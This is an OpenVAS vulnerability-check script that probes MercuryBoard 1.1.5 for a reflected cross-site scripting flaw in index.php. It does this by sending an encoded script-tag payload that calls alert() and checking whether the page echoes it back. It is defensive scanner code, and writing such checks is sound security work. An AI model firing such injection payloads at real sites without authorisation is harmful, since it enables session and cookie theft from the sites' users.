###############################################################################
# OpenVAS Vulnerability Test
# $Id: MercuryBoard_37605.nasl 9043 2018-03-07 12:38:58Z cfischer $
#
# MercuryBoard 'index.php' Cross-Site Scripting Vulnerability
#
# Authors:
# Michael Meyer
#
# Copyright:
# Copyright (c) 2010 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:mercuryboard:mercuryboard";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.100424");
  script_version("$Revision: 9043 $");
  script_tag(name:"last_modification", value:"$Date: 2018-03-07 13:38:58 +0100 (Wed, 07 Mar 2018) $");
  script_tag(name:"creation_date", value:"2010-01-05 18:50:28 +0100 (Tue, 05 Jan 2010)");
  script_bugtraq_id(37605);
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:P/I:N/A:N");
  script_name("MercuryBoard 'index.php' Cross-Site Scripting Vulnerability");
  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_copyright("This script is Copyright (C) 2010 Greenbone Networks GmbH");
  script_dependencies("MercuryBoard_detect.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("MercuryBoard/detected");

  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/37605");
  script_xref(name:"URL", value:"http://www.mercuryboard.com/");

  tag_summary = "MercuryBoard is prone to a cross-site scripting vulnerability because
  the application fails to properly sanitize user-supplied input.";

  tag_impact = "An attacker may leverage this issue to execute arbitrary script code
  in the browser of an unsuspecting user in the context of the affected
  site. This may help the attacker steal cookie-based authentication
  credentials and launch other attacks.";

  tag_affected = "MercuryBoard 1.1.5 is vulnerable; other versions may also be affected.";

  script_tag(name:"summary", value:tag_summary);
  script_tag(name:"impact", value:tag_impact);
  script_tag(name:"affected", value:tag_affected);

  script_tag(name:"qod_type", value:"remote_vul");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");

if( ! port = get_app_port( cpe:CPE ) ) exit( 0 );
if( ! dir = get_app_location( cpe:CPE, port:port ) ) exit( 0 );

if( dir == "/" ) dir = "";
url = dir + "/index.php/%3E%22%3E%3CScRiPt%3Ealert(%27openvas-xss-test%27)%3C/ScRiPt%3E";
req = http_get( item:url, port:port );
buf = http_keepalive_send_recv( port:port, data:req, bodyonly:FALSE );
if( isnull( buf ) ) exit( 0 );

if( buf =~ "^HTTP/1\.[01] 200" && egrep( pattern:"<ScRiPt>alert\('openvas-xss-test'\)</ScRiPt>", string:buf, icase:FALSE ) ) {
  report = report_vuln_url( port:port, url:url );
  security_message( port:port, data:report );
  exit( 0 );
}

exit( 99 );
